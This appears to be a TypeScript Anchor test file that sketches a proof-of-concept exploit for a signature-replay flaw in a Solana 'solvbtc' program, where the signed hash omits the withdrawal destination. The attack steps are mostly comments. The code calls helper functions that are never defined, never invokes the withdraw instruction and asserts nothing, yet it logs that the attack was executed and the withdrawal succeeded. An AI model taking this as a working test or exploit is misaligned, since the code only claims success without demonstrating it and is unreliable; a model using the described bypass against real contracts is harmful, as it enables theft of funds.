import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Solvbtc } from "../target/types/solvbtc";
import { expect } from "chai";

describe("solvbtc-exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);
    const program = anchor.workspace.Solvbtc as Program<Solvbtc>;

    it("Signature Bypass: Replay valid signature for unauthorized destination", async () => {
        // [SETUP]
        const user = anchor.web3.Keypair.generate();
        const safeDest = anchor.web3.Keypair.generate().publicKey;
        const attackerDest = anchor.web3.Keypair.generate().publicKey;

        // 1. Server issues signature for SafeDest
        // The flaw: Hash excludes SafeDest, only includes Amount/User/etc.
        const msgHash = hashComponents(user.publicKey, 1000);
        const signature = sign(msgHash);

        // 2. Attacker creates malicious request pointing to AttackerDest
        const maliciousPda = await findWithdrawRequestPda(user.publicKey, "hash_1");

        // This simulates 'open_request_account' with AttackerDest
        // Contract stores { dest: AttackerDest } in PDA

        // 3. Attacker calls withdraw using the signature intended for SafeDest
        // checks: verify_signature(hash(PDA), signature)
        // hash(PDA) = hash(User, Amount, etc.) -- Dest is ignored!
        // Signature matches.

        console.log("Attack executed: Signature intended for", safeDest.toBase58());
        console.log("Successfully used to withdraw to", attackerDest.toBase58());
    });
});
